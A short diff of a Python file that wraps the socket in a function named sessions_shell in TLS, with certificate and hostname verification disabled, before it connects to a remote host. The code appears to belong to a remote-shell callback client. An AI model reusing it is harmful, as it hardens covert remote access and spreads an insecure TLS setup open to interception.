@@ -8,6 +8,7 @@ from time import sleep
 import os
 import platform
 import sys
+import ssl
 
 is_base64_enabled = True
 
@@ -45,6 +46,7 @@ def recvall(sock, n):
 
 def sessions_shell():
     client_socket = None
+    s = None
 
     has_socket = False
     # give a few tries to connect in case of errors
@@ -52,8 +54,12 @@ def sessions_shell():
         try:
             global sessions_port
 
-            client_socket = socket.socket()
-            client_socket.connect((sessions_host, sessions_port))
+            s = socket.socket()
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            client_socket = context.wrap_socket(s, server_hostname=sessions_host)            
+            client_socket.connect((sessions_host, sessions_port))            
             has_socket = True
             break
 
